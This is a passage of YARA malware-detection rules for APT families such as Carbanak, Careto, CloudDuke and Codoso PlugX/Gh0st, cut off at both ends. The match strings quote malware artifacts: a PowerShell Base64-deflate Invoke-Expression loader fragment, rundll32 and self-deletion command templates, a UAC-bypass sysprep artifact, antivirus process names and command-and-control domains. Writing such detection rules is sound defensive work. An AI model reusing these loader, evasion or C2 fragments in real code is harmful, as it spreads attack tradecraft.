    $header = {51 5C 96 06 03 06 06 06 0A 06 06 06 FF FF 06 06 BE 06 06 06 06 06 06 06 46 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 EE 06 06 06 10 1F BC 10 06 BA 0D D1 25 BE 05 52 D1 25 5A 6E 6D 73 26 76 74 6F 67 74 65 71 26 63 65 70 70 6F 7A 26 64 69 26 74 79 70 26 6D 70 26 4A 4F 53 26 71 6F 6A 69 30 11 11 0C 2A 06 06 06 06 06 06 06 73 43 96 1B 37 24 00 4E 37 24 00 4E 37 24 00 4E BA 40 F6 4E 39 24 00 4E 5E 41 FA 4E 33 24 00 4E 5E 41 FC 4E 39 24 00 4E 37 24 FF 4E 0D 24 00 4E FA 31 A3 4E 40 24 00 4E DF 41 F9 4E 36 24 00 4E F6 2A FE 4E 38 24 00 4E DF 41 FC 4E 38 24 00 4E 54 6D 63 6E 37 24 00 4E 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 56 49 06 06 52 05 09 06 5D 87 8C 5A 06 06 06 06 06 06 06 06 E6 06 10 25 0B 05 08 06 06 1C 06 06 06 1A 06 06 06 06 06 06 E5 27 06 06 06 16 06 06 06 36 06 06 06 06 06 16 06 16 06 06 06 04 06 06 0A 06 06 06 06 06 06 06 0A 06 06 06 06 06 06 06 06 76 06 06 06 0A 06 06 06 06 06 06 04 06 06 06 06 06 16 06 06 16 06 06}
  condition:
    $header at 0
}

rule apt_c16_win32_dropper 
{
  meta:
    author = "@dragonthreatlab"
    md5 = "ad17eff26994df824be36db246c8fb6a"
    description = "APT malware used to drop PcClient RAT"
    date        = "2015/01/11" 
    reference   = "http://blog.dragonthreatlabs.com/2015/01/dtl-12012015-01-hong-kong-swc-attack.html"
  strings:
    $mz = {4D 5A}
    $str1 = "clbcaiq.dll" ascii
    $str2 = "profapi_104" ascii
    $str3 = "/ShowWU" ascii
    $str4 = "Software\\Microsoft\\Windows\\CurrentVersion\\" ascii
    $str5 = {8A 08 2A CA 32 CA 88 08 40 4E 75 F4 5E}
  condition:
    $mz at 0 and all of ($str*)
}

rule apt_c16_win_swisyn 
{
  meta:
    author = "@dragonthreatlab"
    md5 = "a6a18c846e5179259eba9de238f67e41"
    description = "File matching the md5 above tends to only live in memory, hence the lack of MZ header check."
    date        = "2015/01/11" 
    reference   = "http://blog.dragonthreatlabs.com/2015/01/dtl-12012015-01-hong-kong-swc-attack.html"
  strings:
    $mz = {4D 5A}
    $str1 = "/ShowWU" ascii
    $str2 = "IsWow64Process"
    $str3 = "regsvr32 "
    $str4 = {8A 11 2A 55 FC 8B 45 08 88 10 8B 4D 08 8A 11 32 55 FC 8B 45 08 88 10}
  condition:
    $mz at 0 and all of ($str*)
}

rule apt_c16_win_wateringhole 
{
  meta:
    author = "@dragonthreatlab"
    description = "Detects code from APT wateringhole"
    date        = "2015/01/11" 
    reference   = "http://blog.dragonthreatlabs.com/2015/01/dtl-12012015-01-hong-kong-swc-attack.html"
  strings:
    $str1 = "function runmumaa()"
    $str2 = "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String("
    $str3 = "function MoSaklgEs7(k)"
  condition:
    any of ($str*)
}

rule apt_c16_win64_dropper
{
    meta:
        author      = "@dragonthreatlab"
        date        = "2015/01/11" 
        description = "APT malware used to drop PcClient RAT"
        reference   = "http://blog.dragonthreatlabs.com/2015/01/dtl-12012015-01-hong-kong-swc-attack.html"

    strings:
        $mz = { 4D 5A }
        $str1 = "clbcaiq.dll" ascii
        $str2 = "profapi_104" ascii
        $str3 = "\\Microsoft\\wuauclt\\wuauclt.dat" ascii
        $str4 = { 0F B6 0A 48 FF C2 80 E9 03 80 F1 03 49 FF C8 88 4A FF 75 EC }

    condition:
        $mz at 0 and all of ($str*)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-09-03
	Identifier: Carbanak Rules
*/

/* Rule Set ----------------------------------------------------------------- */

rule Carbanak_0915_1 {
	meta:
		description = "Carbanak Malware"
		author = "Florian Roth"
		reference = "https://www.csis.dk/en/csis/blog/4710/"
		date = "2015-09-03"
		score = 70
	strings:
		$s1 = "evict1.pdb" fullword ascii
		$s2 = "http://testing.corp 0" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and 1 of them
}

rule Carbanak_0915_2 {
	meta:
		description = "Carbanak Malware"
		author = "Florian Roth"
		reference = "https://www.csis.dk/en/csis/blog/4710/"
		date = "2015-09-03"
		score = 70
	strings:
		$x1 = "8Rkzy.exe" fullword wide

		$s1 = "Export Template" fullword wide
		$s2 = "Session folder with name '%s' already exists." fullword ascii
		$s3 = "Show Unconnected Endpoints (Ctrl+U)" fullword ascii
		$s4 = "Close All Documents" fullword wide
		$s5 = "Add &Resource" fullword ascii
		$s6 = "PROCEXPLORER" fullword wide /* Goodware String - occured 1 times */
		$s7 = "AssocQueryKeyA" fullword ascii /* Goodware String - occured 4 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 500KB and ( $x1 or all of ($s*) )
}

rule Carbanak_0915_3 {
	meta:
		description = "Carbanak Malware"
		author = "Florian Roth"
		reference = "https://www.csis.dk/en/csis/blog/4710/"
		date = "2015-09-03"
		score = 70
	strings:
		$s1 = "wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww" fullword ascii
		$s2 = "SHInvokePrinterCommandA" fullword ascii
		$s3 = "Ycwxnkaj" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 700KB and all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as long as you use it under this license.
*/

import "pe"

rule Careto_SGH {
	meta:
		author = "AlienVault (Alberto Ortega)"
		description = "TheMask / Careto SGH component signature"
		reference = "www.securelist.com/en/downloads/vlpdfs/unveilingthemask_v1.0.pdf"
		date = "2014/02/11"
	strings:
		$m1 = "PGPsdkDriver" ascii wide fullword
		$m2 = "jpeg1x32" ascii wide fullword
		$m3 = "SkypeIE6Plugin" ascii wide fullword
		$m4 = "CDllUninstall" ascii wide fullword
	condition:
		2 of them
}

rule Careto_OSX_SBD {
	meta:
		author = "AlienVault (Alberto Ortega)"
		description = "TheMask / Careto OSX component signature"
		reference = "www.securelist.com/en/downloads/vlpdfs/unveilingthemask_v1.0.pdf"
		date = "2014/02/11"
	strings:
		/* XORed "/dev/null strdup() setuid(geteuid())" */
		$1 = {FF 16 64 0A 7E 1A 63 4D 21 4D 3E 1E 60 0F 7C 1A 65 0F 74 0B 3E 1C 7F 12}
	condition:
		all of them
}

rule Careto_CnC {
	meta:
		author = "AlienVault (Alberto Ortega)"
		description = "TheMask / Careto CnC communication signature"
		reference = "www.securelist.com/en/downloads/vlpdfs/unveilingthemask_v1.0.pdf"
		date = "2014/02/11"
	strings:
		$1 = "cgi-bin/commcgi.cgi" ascii wide
		$2 = "Group" ascii wide
		$3 = "Install" ascii wide
		$4 = "Bn" ascii wide
	condition:
		all of them
}

rule Careto_CnC_domains {
	meta:
		author = "AlienVault (Alberto Ortega)"
		description = "TheMask / Careto known command and control domains"
		reference = "www.securelist.com/en/downloads/vlpdfs/unveilingthemask_v1.0.pdf"
		date = "2014/02/11"
	strings:
		$1 = "linkconf.net" ascii wide nocase
		$2 = "redirserver.net" ascii wide nocase
		$3 = "swupdt.com" ascii wide nocase
	condition:
		any of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-08-08
	Identifier: Cheshire Cat
	Version: 0.1 
*/

/* Rule Set ----------------------------------------------------------------- */

rule CheshireCat_Sample2 {
	meta:
		description = "Auto-generated rule - file dc18850d065ff6a8364421a9c8f9dd5fcce6c7567f4881466cee00e5cd0c7aa8"
		author = "Florian Roth"
		reference = "https://malware-research.org/prepare-father-of-stuxnet-news-are-coming/"
		date = "2015-08-08"
		score = 70
		hash = "dc18850d065ff6a8364421a9c8f9dd5fcce6c7567f4881466cee00e5cd0c7aa8"
	strings:
		$s0 = "mpgvwr32.dll" fullword ascii
		$s1 = "Unexpected failure of wait! (%d)" fullword ascii
		$s2 = "\"%s\" /e%d /p%s" fullword ascii
		$s4 = "error in params!" fullword ascii
		$s5 = "sscanf" fullword ascii
		$s6 = "<>Param : 0x%x" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and 4 of ($s*)
}

/* Generic Rules ----------------------------------------------------------- */
/* Gen1 is more exact than Gen2 - until now I had no FPs with Gen2 */

rule CheshireCat_Gen1 {
	meta:
		description = "Auto-generated rule - file ec41b029c3ff4147b6a5252cb8b659f851f4538d4af0a574f7e16bc1cd14a300"
		author = "Florian Roth"
		reference = "https://malware-research.org/prepare-father-of-stuxnet-news-are-coming/"
		date = "2015-08-08"
		super_rule = 1
		score = 90
		hash1 = "ec41b029c3ff4147b6a5252cb8b659f851f4538d4af0a574f7e16bc1cd14a300"
		hash2 = "32159d2a16397823bc882ddd3cd77ecdbabe0fde934e62f297b8ff4d7b89832a"
		hash3 = "63735d555f219765d486b3d253e39bd316bbcb1c0ec595ea45ddf6e419bef3cb"
		hash4 = "c074aeef97ce81e8c68b7376b124546cabf40e2cd3aff1719d9daa6c3f780532"
	strings:
		$x1 = "CAPESPN.DLL" fullword wide
		$x2 = "WINF.DLL" fullword wide
		$x3 = "NCFG.DLL" fullword wide
		$x4 = "msgrthlp.dll" fullword wide
		$x5 = "Local\\{c0d9770c-9841-430d-b6e3-575dac8a8ebf}" fullword ascii
		$x6 = "Local\\{1ef9f94a-5664-48a6-b6e8-c3748db459b4}" fullword ascii

		$a1 = "Interface\\%s\\info" fullword ascii
		$a2 = "Interface\\%s\\info\\%s" fullword ascii
		$a3 = "CLSID\\%s\\info\\%s" fullword ascii
		$a4 = "CLSID\\%s\\info" fullword ascii

		$b1 = "Windows Shell Icon Handler" fullword wide
		$b2 = "Microsoft Shell Icon Handler" fullword wide

		$s1 = "\\StringFileInfo\\%s\\FileVersion" fullword ascii
		$s2 = "CLSID\\%s\\AuxCLSID" fullword ascii
		$s3 = "lnkfile\\shellex\\IconHandler" fullword ascii
		$s4 = "%s: %s, %.2hu %s %hu %2.2hu:%2.2hu:%2.2hu GMT" fullword ascii
		$s5 = "%sMutex" fullword ascii
		$s6 = "\\ShellIconCache" fullword ascii
		$s7 = "+6Service Pack " fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 350KB and 7 of ($s*) and 2 of ($a*) and 1 of ($b*) and 1 of ($x*)
}

rule CheshireCat_Gen2 {
	meta:
		description = "Auto-generated rule - from files 32159d2a16397823bc882ddd3cd77ecdbabe0fde934e62f297b8ff4d7b89832a, 63735d555f219765d486b3d253e39bd316bbcb1c0ec595ea45ddf6e419bef3cb"
		author = "Florian Roth"
		reference = "https://malware-research.org/prepare-father-of-stuxnet-news-are-coming/"
		date = "2015-08-08"
		super_rule = 1
		score = 70
		hash1 = "ec41b029c3ff4147b6a5252cb8b659f851f4538d4af0a574f7e16bc1cd14a300"
		hash2 = "32159d2a16397823bc882ddd3cd77ecdbabe0fde934e62f297b8ff4d7b89832a"
		hash3 = "63735d555f219765d486b3d253e39bd316bbcb1c0ec595ea45ddf6e419bef3cb"
		hash4 = "c074aeef97ce81e8c68b7376b124546cabf40e2cd3aff1719d9daa6c3f780532"
	strings:
		$a1 = "Interface\\%s\\info" fullword ascii
		$a2 = "Interface\\%s\\info\\%s" fullword ascii
		$a3 = "CLSID\\%s\\info\\%s" fullword ascii
		$a4 = "CLSID\\%s\\info" fullword ascii

		$b1 = "Windows Shell Icon Handler" fullword wide
		$b2 = "Microsoft Shell Icon Handler" fullword wide

		$s1 = "\\StringFileInfo\\%s\\FileVersion" fullword ascii
		$s2 = "CLSID\\%s\\AuxCLSID" fullword ascii
		$s3 = "lnkfile\\shellex\\IconHandler" fullword ascii
		$s4 = "%s: %s, %.2hu %s %hu %2.2hu:%2.2hu:%2.2hu GMT" fullword ascii
		$s5 = "%sMutex" fullword ascii
		$s6 = "\\ShellIconCache" fullword ascii
		$s7 = "+6Service Pack " fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and 7 of ($s*) and 2 of ($a*) and 1 of ($b*)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule CloudDuke_Malware {
	meta:
		description = "Detects CloudDuke Malware"
		author = "Florian Roth"
		reference = "https://www.f-secure.com/weblog/archives/00002822.html"
		date = "2015-07-22"
		score = 60
		hash1 = "97d8725e39d263ed21856477ed09738755134b5c0d0b9ae86ebb1cdd4cdc18b7"
		hash2 = "88a40d5b679bccf9641009514b3d18b09e68b609ffaf414574a6eca6536e8b8f"
		hash3 = "1d4ac97d43fab1d464017abb5d57a6b4601f99eaa93b01443427ef25ae5127f7"
		hash4 = "97d8725e39d263ed21856477ed09738755134b5c0d0b9ae86ebb1cdd4cdc18b7"
		hash5 = "1d4ac97d43fab1d464017abb5d57a6b4601f99eaa93b01443427ef25ae5127f7"
		hash6 = "88a40d5b679bccf9641009514b3d18b09e68b609ffaf414574a6eca6536e8b8f"
		hash7 = "ed7abf93963395ce9c9cba83a864acb4ed5b6e57fd9a6153f0248b8ccc4fdb46"
		hash8 = "97d8725e39d263ed21856477ed09738755134b5c0d0b9ae86ebb1cdd4cdc18b7"
		hash9 = "ed7abf93963395ce9c9cba83a864acb4ed5b6e57fd9a6153f0248b8ccc4fdb46"
		hash10 = "ee5eb9d57c3611e91a27bb1fc2d0aaa6bbfa6c69ab16e65e7123c7c49d46f145"
		hash11 = "a713982d04d2048a575912a5fc37c93091619becd5b21e96f049890435940004"
		hash12 = "56ac764b81eb216ebed5a5ad38e703805ba3e1ca7d63501ba60a1fb52c7ebb6e"
		hash13 = "ee5eb9d57c3611e91a27bb1fc2d0aaa6bbfa6c69ab16e65e7123c7c49d46f145"
		hash14 = "a713982d04d2048a575912a5fc37c93091619becd5b21e96f049890435940004"
		hash15 = "56ac764b81eb216ebed5a5ad38e703805ba3e1ca7d63501ba60a1fb52c7ebb6e"
	strings:
		$s1 = "ProcDataWrap" fullword ascii
		$s2 = "imagehlp.dll" fullword ascii
		$s3 = "dnlibsh" fullword ascii
		$s4 = "%ws_out%ws" fullword wide
		$s5 = "Akernel32.dll" fullword wide

		$op0 = { 0f b6 80 68 0e 41 00 0b c8 c1 e1 08 0f b6 c2 8b } /* Opcode */
		$op1 = { 8b ce e8 f8 01 00 00 85 c0 74 41 83 7d f8 00 0f } /* Opcode */
		$op2 = { e8 2f a2 ff ff 83 20 00 83 c8 ff 5f 5e 5d c3 55 } /* Opcode */
	condition:
		uint16(0) == 0x5a4d and filesize < 720KB and 4 of ($s*) and 1 of ($op*)
}

/* Super Rules ------------------------------------------------------------- */

rule SFXmalware_rar_Acrotray {
	meta:
		description = "Most likely a malicious file acrotray in SFX malware_rar / CloudDuke APT 5442.1.exe, 5442.2.exe"
		author = "Florian Roth"
		reference = "https://www.f-secure.com/weblog/archives/00002822.html"
		date = "2015-07-22"
		super_rule = 1
		score = 70
		hash1 = "51e713c7247f978f5836133dd0b8f9fb229e6594763adda59951556e1df5ee57"
		hash2 = "5d695ff02202808805da942e484caa7c1dc68e6d9c3d77dc383cfa0617e61e48"
		hash3 = "56531cc133e7a760b238aadc5b7a622cd11c835a3e6b78079d825d417fb02198"
	strings:
		$s1 = "winmalware_rarsfxmappingfile.tmp" fullword wide /* PEStudio Blacklist: strings */
		$s2 = "GETPASSWORD1" fullword wide /* PEStudio Blacklist: strings */
		$s3 = "acrotray.exe" fullword ascii
		$s4 = "CryptUnprotectMemory failed" fullword wide /* PEStudio Blacklist: strings */
	condition:
		uint16(0) == 0x5a4d and filesize < 2449KB and all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-01-30
	Identifier: Codoso
	Comment: Reduced signature set for LOKI integration
*/

/* Rule Set ----------------------------------------------------------------- */

rule Codoso_PlugX_3 {
	meta:
		description = "Detects Codoso APT PlugX Malware"
		author = "Florian Roth"
		reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
		date = "2016-01-30"
		hash = "74e1e83ac69e45a3bee78ac2fac00f9e897f281ea75ed179737e9b6fe39971e3"
	strings:
		$s1 = "Cannot create folder %sDCRC failed in the encrypted file %s. Corrupt file or wrong password." fullword wide
		$s2 = "mcs.exe" fullword ascii
		$s3 = "McAltLib.dll" fullword ascii
		$s4 = "Winmalware_rar self-extracting archive" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 1200KB and all of them
}
rule Codoso_PlugX_2 {
	meta:
		description = "Detects Codoso APT PlugX Malware"
		author = "Florian Roth"
		reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
		date = "2016-01-30"
		hash = "b9510e4484fa7e3034228337768176fce822162ad819539c6ca3631deac043eb"
	strings:
		$s1 = "%TEMP%\\HID" fullword wide
		$s2 = "%s\\hid.dll" fullword wide
		$s3 = "%s\\SOUNDMAN.exe" fullword wide
		$s4 = "\"%s\\SOUNDMAN.exe\" %d %d" fullword wide
		$s5 = "%s\\HID.dllx" fullword wide
	condition:
		( uint16(0) == 0x5a4d and filesize < 400KB and 3 of them ) or all of them
}
rule Codoso_CustomTCP_4 {
	meta:
		description = "Detects Codoso APT CustomTCP Malware"
		author = "Florian Roth"
		reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
		date = "2016-01-30"
		hash1 = "ea67d76e9d2e9ce3a8e5f80ff9be8f17b2cd5b1212153fdf36833497d9c060c0"
		hash2 = "130abb54112dd47284fdb169ff276f61f2b69d80ac0a9eac52200506f147b5f8"
		hash3 = "3ea6b2b51050fe7c07e2cf9fa232de6a602aa5eff66a2e997b25785f7cf50daa"
		hash4 = "02cf5c244aebaca6195f45029c1e37b22495609be7bdfcfcd79b0c91eac44a13"
	strings:
		$x1 = "varus_service_x86.dll" fullword ascii

		$s1 = "/s %s /p %d /st %d /rt %d" fullword ascii
		$s2 = "net start %%1" fullword ascii
		$s3 = "ping 127.1 > nul" fullword ascii
		$s4 = "McInitMISPAlertEx" fullword ascii
		$s5 = "sc start %%1" fullword ascii
		$s6 = "net stop %%1" fullword ascii
		$s7 = "WorkerRun" fullword ascii
	condition:
		( uint16(0) == 0x5a4d and filesize < 400KB and 5 of them ) or
		( $x1 and 2 of ($s*) )
}
rule Codoso_CustomTCP_3 {
	meta:
		description = "Detects Codoso APT CustomTCP Malware"
		author = "Florian Roth"
		reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
		date = "2016-01-30"
		hash = "d66106ec2e743dae1d71b60a602ca713b93077f56a47045f4fc9143aa3957090"
	strings:
		$s1 = "DnsApi.dll" fullword ascii
		$s2 = "softWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\%s" ascii
		$s3 = "CONNECT %s:%d hTTP/1.1" ascii
		$s4 = "CONNECT %s:%d HTTp/1.1" ascii
		$s5 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0;)" ascii
		$s6 = "iphlpapi.dll" ascii
		$s7 = "%systemroot%\\Web\\" ascii
		$s8 = "Proxy-Authorization: Negotiate %s" ascii
		$s9 = "CLSID\\{%s}\\InprocServer32" ascii
	condition:
		( uint16(0) == 0x5a4d and filesize < 500KB and 5 of them ) or 7 of them
}
rule Codoso_CustomTCP_2 {
	meta:
		description = "Detects Codoso APT CustomTCP Malware"
		author = "Florian Roth"
		reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
		date = "2016-01-30"
		hash = "3577845d71ae995762d4a8f43b21ada49d809f95c127b770aff00ae0b64264a3"
	strings:
		$s1 = "varus_service_x86.dll" fullword ascii
		$s2 = "/s %s /p %d /st %d /rt %d" fullword ascii
		$s3 = "net start %%1" fullword ascii
		$s4 = "ping 127.1 > nul" fullword ascii
		$s5 = "McInitMISPAlertEx" fullword ascii
		$s6 = "sc start %%1" fullword ascii
		$s7 = "B_WKNDNSK^" fullword ascii
		$s8 = "net stop %%1" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 406KB and all of them
}
rule Codoso_PGV_PVID_6 {
	meta:
		description = "Detects Codoso APT PGV_PVID Malware"
		author = "Florian Roth"
		reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
		date = "2016-01-30"
		hash = "4b16f6e8414d4192d0286b273b254fa1bd633f5d3d07ceebd03dfdfc32d0f17f"
	strings:
		$s0 = "rundll32 \"%s\",%s" fullword ascii
		$s1 = "/c ping 127.%d & del \"%s\"" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 6000KB and all of them
}
rule Codoso_Gh0st_3 {
	meta:
		description = "Detects Codoso APT Gh0st Malware"
		author = "Florian Roth"
		reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
		date = "2016-01-30"
		hash = "bf52ca4d4077ae7e840cf6cd11fdec0bb5be890ddd5687af5cfa581c8c015fcd"
	strings:
		$x1 = "RunMeByDLL32" fullword ascii

		$s1 = "svchost.dll" fullword wide
		$s2 = "server.dll" fullword ascii
		$s3 = "Copyright ? 2008" fullword wide
		$s4 = "testsupdate33" fullword ascii
		$s5 = "Device Protect Application" fullword wide
		$s6 = "MSVCP60.DLL" fullword ascii /* Goodware String - occured 1 times */
		$s7 = "mail-news.eicp.net" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 195KB and $x1 or 4 of them
}
rule Codoso_Gh0st_2 {
	meta:
		description = "Detects Codoso APT Gh0st Malware"
		author = "Florian Roth"
		reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
		date = "2016-01-30"
		hash = "5402c785037614d09ad41e41e11093635455b53afd55aa054a09a84274725841"
	strings:
		$s0 = "cmd.exe /c ping 127.0.0.1 && ping 127.0.0.1 && sc start %s && ping 127.0.0.1 && sc start %s" fullword ascii
		$s1 = "rundll32.exe \"%s\", RunMeByDLL32" fullword ascii
		$s13 = "Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}" fullword wide
		$s14 = "%s -r debug 1" fullword ascii
		$s15 = "\\\\.\\keymmdrv1" fullword ascii
		$s17 = "RunMeByDLL32" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 500KB and 1 of them
}
rule Codoso_CustomTCP {
	meta:
		description = "Codoso CustomTCP Malware"
		author = "Florian Roth"
		reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
		date = "2016-01-30"
		hash = "b95d7f56a686a05398198d317c805924c36f3abacbb1b9e3f590ec0d59f845d8"
	strings:
		$s4 = "wnyglw" fullword ascii
		$s5 = "WorkerRun" fullword ascii
		$s7 = "boazdcd" fullword ascii
		$s8 = "wayflw" fullword ascii
		$s9 = "CODETABL" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 405KB and all of them
}

/* Super Rules ------------------------------------------------------------- */

rule Codoso_PGV_PVID_5 {
	meta:
		description = "Detects Codoso APT PGV PVID Malware"
		author = "Florian Roth"
		reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
		date = "2016-01-30"
		super_rule = 1
		hash1 = "13bce64b3b5bdfd24dc6f786b5bee08082ea736be6536ef54f9c908fd1d00f75"
		hash2 = "bc0b885cddf80755c67072c8b5961f7f0adcaeb67a1a5c6b3475614fd51696fe"
	strings:
		$s1 = "/c del %s >> NUL" fullword ascii
		$s2 = "%s%s.manifest" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 500KB and all of them
}
rule Codoso_Gh0st_1 {
	meta:
		description = "Detects Codoso APT Gh0st Malware"
		author = "Florian Roth"
		reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
		date = "2016-01-30"
		super_rule = 1
		hash1 = "5402c785037614d09ad41e41e11093635455b53afd55aa054a09a84274725841"
		hash2 = "7dc7cec2c3f7e56499175691f64060ebd955813002d4db780e68a8f6e7d0a8f8"
		hash3 = "d7004910a87c90ade7e5ff6169f2b866ece667d2feebed6f0ec856fb838d2297"
	strings:
		$x1 = "cmd.exe /c ping 127.0.0.1 && ping 127.0.0.1 && sc start %s && ping 127.0.0.1 && sc start %s" fullword ascii
		$x2 = "rundll32.exe \"%s\", RunMeByDLL32" fullword ascii
		$x3 = "Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}" fullword wide
		$x4 = "\\\\.\\keymmdrv1" fullword ascii

		$s1 = "spideragent.exe" fullword ascii
		$s2 = "AVGIDSAgent.exe" fullword ascii
		$s3 = "kavsvc.exe" fullword ascii
		$s4 = "mspaint.exe" fullword ascii
		$s5 = "kav.exe" fullword ascii
		$s6 = "avp.exe" fullword ascii
		$s7 = "NAV.exe" fullword ascii

		$c1 = "Elevation:Administrator!new:" wide
		$c2 = "Global\\RUNDLL32EXITEVENT_NAME{12845-8654-543}" fullword ascii
		$c3 = "\\sysprep\\sysprep.exe" fullword wide
		$c4 = "\\sysprep\\CRYPTBASE.dll" fullword wide
		$c5 = "Global\\TERMINATEEVENT_NAME{12845-8654-542}" fullword ascii
		$c6 = "ConsentPromptBehaviorAdmin" fullword ascii
		$c7 = "\\sysprep" fullword wide
		$c8 = "Global\\UN{5FFC0C8B-8BE5-49d5-B9F2-BCDC8976EE10}" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and ( 4 of ($s*) or 4 of ($c*) ) or
		1 of ($x*) or
		6 of ($c*)
}
rule Codoso_PGV_PVID_4 {
	meta:
		description = "Detects Codoso APT PlugX Malware"
		author = "Florian Roth"
		reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
		date = "2016-01-30"
		super_rule = 1
		hash1 = "13bce64b3b5bdfd24dc6f786b5bee08082ea736be6536ef54f9c908fd1d00f75"
		hash2 = "8a56b476d792983aea0199ee3226f0d04792b70a1c1f05f399cb6e4ce8a38761"
		hash3 = "b2950f2e09f5356e985c38b284ea52175d21feee12e582d674c0da2233b1feb1"
		hash4 = "b631553421aa17171cc47248adc110ca2e79eff44b5e5b0234d69b30cab104e3"
		hash5 = "bc0b885cddf80755c67072c8b5961f7f0adcaeb67a1a5c6b3475614fd51696fe"
	strings:
		$x1 = "dropper, Version 1.0" fullword wide
		$x2 = "dropper" fullword wide
		$x3 = "DROPPER" fullword wide
		$x4 = "About dropper" fullword wide

		$s1 = "Microsoft Windows Manager Utility" fullword wide
		$s2 = "SYSTEM\\CurrentControlSet\\Services\\" fullword ascii /* Goodware String - occured 9 times */
		$s3 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify" fullword ascii /* Goodware String - occured 10 times */
		$s4 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3" ascii /* Goodware String - occured 46 times */
		$s5 = "<supportedOS Id=\"{e2011457-1546-43c5-a5fe-008deee3d3f0}\"></supportedOS>" fullword ascii /* Goodware String - occured 65 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 900KB and 1 of ($x*) and 2 of ($s*)
}
rule Codoso_PlugX_1 {
	meta:
		description = "Detects Codoso APT PlugX Malware"
		author = "Florian Roth"
		reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
		date = "2016-01-30"
		super_rule = 1
		hash1 = "0b8cbc9b4761ab35acce2aa12ba2c0a283afd596b565705514fd802c8b1e144b"
		hash2 = "448711bd3f689ceebb736d25253233ac244d48cb766834b8f974c2e9d4b462e8"
		hash3 = "fd22547497ce52049083092429eeff0599d0b11fe61186e91c91e1f76b518fe2"
	strings:
		$s1 = "GETPASSWORD1" fullword ascii
		$s2 = "NvSmartMax.dll" fullword ascii
		$s3 = "LICENSEDLG" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 800KB and all of them
}
rule Codoso_PGV_PVID_3 {
	meta:
		description = "Detects Codoso APT PGV PVID Malware"
		author = "Florian Roth"
		reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
		date = "2016-01-30"
		super_rule = 1
		hash1 = "126fbdcfed1dfb31865d4b18db2fb963f49df838bf66922fea0c37e06666aee1"
		hash2 = "13bce64b3b5bdfd24dc6f786b5bee08082ea736be6536ef54f9c908fd1d00f75"
		hash3 = "8a56b476d792983aea0199ee3226f0d04792b70a1c1f05f399cb6e4ce8a38761"
		hash4 = "b2950f2e09f5356e985c38b284ea52175d21feee12e582d674c0da2233b1feb1"
		hash5 = "b631553421aa17171cc47248adc110ca2e79eff44b5e5b0234d69b30cab104e3"
		hash6 = "bc0b885cddf80755c67072c8b5961f7f0adcaeb67a1a5c6b3475614fd51696fe"
	strings:
		$x1 = "Copyright (C) Microsoft Corporation.  All rights reserved.(C) 2012" fullword wide
	condition:
		$x1
}
rule Codoso_PGV_PVID_2 {
	meta:
		description = "Detects Codoso APT PGV PVID Malware"
		author = "Florian Roth"
